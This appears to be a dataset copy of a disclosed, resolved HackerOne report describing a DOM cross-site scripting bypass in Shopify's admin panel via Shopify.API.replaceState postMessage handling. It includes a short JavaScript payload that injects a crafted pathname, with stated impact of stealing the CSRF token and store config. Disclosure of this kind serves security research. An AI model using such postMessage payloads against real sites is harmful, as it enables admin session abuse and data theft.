---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '883867'
original_report_id: '883867'
title: Inject page in admin panel via Shopify.API.pushState [New Payload]
weakness: Cross-site Scripting (XSS) - DOM
team_handle: shopify
created_at: '2020-05-27T19:05:49.705Z'
disclosed_at: '2020-12-27T22:14:47.302Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 19
asset_identifier: your-store.myshopify.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# Inject page in admin panel via Shopify.API.pushState [New Payload]

## Metadata

- HackerOne Report ID: 883867
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: shopify
- Disclosed At: 2020-12-27T22:14:47.302Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

The correction for #868615, allows you to use new payload:

```js
const ctx = window.open(location.origin+'/admin/themes', '_blank')
const data = JSON.stringify({
                  message: 'Shopify.API.replaceState',
                  data: {pathname: "abc:d../pages/xss#//"}
});
ctx.postMessage(data)
```

## Impact

Abuse the active admin session to extract data as:

- CSRF token.
- Store config.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
